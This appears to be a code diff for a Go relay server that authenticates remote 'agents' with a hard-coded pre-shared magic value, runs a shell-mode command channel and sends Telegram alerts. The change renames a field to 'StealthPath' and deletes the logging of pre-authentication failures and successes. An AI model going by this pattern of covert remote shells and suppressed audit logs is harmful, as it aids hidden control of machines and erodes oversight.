@@ -118,12 +118,12 @@ func backgroundPacketProcessor(peerID string, conn net.Conn, remoteAddr string) 
 		if eventType != "" {
 			logger.Printf("[ALERT] %s from %s: %s", eventType, remoteAddr, payload)
 			err := telegram.SendAlert(telegram.AlertData{
-				EventType: eventType,
-				Hostname:  hostname,
-				User:      user,
-				IP:        remoteAddr,
-				FilePath:  payload,
-				Details:   fmt.Sprintf("Real-time event captured by agent monitor"),
+				Type:          eventType,
+				Hostname:      hostname,
+				User:          user,
+				IP:            remoteAddr,
+				StealthPath:   payload,
+				ActionDetails: fmt.Sprintf("Real-time event captured by agent monitor"),
 			})
 			if err != nil {
 				logger.Printf("[ERROR] Failed to send notification: %v", err)
@@ -241,17 +241,14 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 	pskBuf := make([]byte, 4)
 	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
 	if _, err := io.ReadFull(conn, pskBuf); err != nil {
-		logger.Printf("Pre-Auth failed (no PSK) from %s", remoteAddr)
 		conn.Close()
 		return
 	}
 	// Expected PSK (OYEN)
 	if binary.BigEndian.Uint32(pskBuf) != 0x4F59454E {
-		logger.Printf("Pre-Auth failed (invalid PSK) from %s", remoteAddr)
 		conn.Close()
 		return
 	}
-	logger.Printf("Pre-Auth successful from %s", remoteAddr)
 
 	// Explicit TLS Handshake for early error detection
 	if tlsConn, ok := conn.(*tls.Conn); ok {
@@ -300,12 +297,12 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 	logger.Printf("[SUCCESS] Peer %s authenticated and registered from %s", peerID, remoteAddr)
 
 	telegram.SendAlert(telegram.AlertData{
-		EventType: "AGENT_ONLINE",
-		Hostname:  "N/A",
-		User:      "N/A",
-		IP:        remoteAddr,
-		FilePath:  "N/A",
-		Details:   fmt.Sprintf("Agent %s is now online and registered.", peerID),
+		Type:          "AGENT_ONLINE",
+		Hostname:      "N/A",
+		User:          "N/A",
+		IP:            remoteAddr,
+		StealthPath:   "N/A",
+		ActionDetails: fmt.Sprintf("Agent %s is now online and registered.", peerID),
 	})
 
 	registry.UpdatePeerState(peerID, peer.PeerStateAuthenticated)
@@ -557,12 +554,12 @@ func readCommandResponseWithMode(conn net.Conn, shellMode bool) {
 			payload := string(dataBuf)
 			logger.Printf("Received Sentinel Alert: %s", payload)
 			go telegram.SendAlert(telegram.AlertData{
-				EventType: "CONSOLE_ALERT",
-				Hostname:  "RELAY",
-				User:      "ADMIN",
-				IP:        "127.0.0.1",
-				FilePath:  "N/A",
-				Details:   payload,
+				Type:          "CONSOLE_ALERT",
+				Hostname:      "RELAY",
+				User:          "ADMIN",
+				IP:            "127.0.0.1",
+				StealthPath:   "N/A",
+				ActionDetails: payload,
 			})
 			continue
 		}
